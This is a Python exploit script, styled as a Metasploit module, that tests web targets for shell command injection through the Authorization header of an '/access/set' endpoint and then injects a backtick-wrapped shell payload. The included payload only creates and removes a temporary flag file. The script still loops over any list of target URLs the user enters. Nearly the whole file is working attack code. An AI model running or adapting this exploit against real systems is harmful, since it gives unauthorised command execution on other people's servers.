import requests
import random
import string

class MetasploitModule:
    def __init__(self):
        pass

    def check_and_exploit(self, target_uri):
        uri = f"{target_uri}/access/set"
        authorization_header = f"'`echo '"
        authorization_header += ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 15)))

        print(f"Checking if {uri} is vulnerable...")
        res = requests.get(uri, params={'param': 'enableapi', 'value': '1'},
                           headers={'authorization': authorization_header},
                           verify=False)
        if res.status_code == 200 and ('unexpected EOF while looking for matching' in res.headers or 'unexpected EOF while looking for matching' in res.text):
            print(f"{target_uri} is vulnerable. Exploiting...")
            self.exploit(target_uri)
        else:
            print(f"{target_uri} is not vulnerable.")

    def exploit(self, target_uri):
        flag_file = '/tmp/' + ''.join(random.choices(string.ascii_lowercase, k=5))
        payload = f"[ -f {flag_file} ] || ( touch {flag_file}; (sleep 60; rm {flag_file})& )"
        uri = f"{target_uri}/access/set"
        authorization_header = f"'`{payload}`;echo '"
        authorization_header += ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 15)))

        print("Sending payload...")
        res = requests.get(uri, params={'param': 'enableapi', 'value': '1'},
                           headers={'authorization': authorization_header},
                           verify=False)
        if res.status_code == 200:
            print("Exploit successful!")
        else:
            print("Exploit failed.")

if __name__ == "__main__":
    module = MetasploitModule()
    target_urls = input("Enter a list of target URLs separated by spaces: ").split()

    for url in target_urls:
        module.check_and_exploit(url)
